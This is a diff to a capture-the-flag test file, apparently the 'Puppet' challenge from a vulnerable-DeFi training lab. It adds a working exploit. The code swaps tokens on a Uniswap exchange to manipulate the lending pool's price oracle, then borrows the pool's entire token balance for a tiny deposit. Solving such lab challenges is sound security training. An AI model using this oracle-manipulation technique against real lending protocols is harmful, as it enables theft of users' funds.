@@ -102,7 +102,24 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT -- SOLVED */
+        /** 
+         * manipulate price on exchange by swapping 1000 tokens for ~10 eth
+         * 
+         * borrow all tokens from the pool
+         * */
+
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther("1000"));
+
+        const tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(ethers.utils.parseEther('9.9'),
+            ethers.utils.parseEther("1000"),
+            (await ethers.provider.getBlock('latest')).timestamp + 1,
+            { gasLimit: 1e6 }
+        );
+        await tx.wait();
+
+        const depositRequired = await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther("100000"));
+        await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther("100000"), { value: depositRequired });
     });
 
     after(async function () {
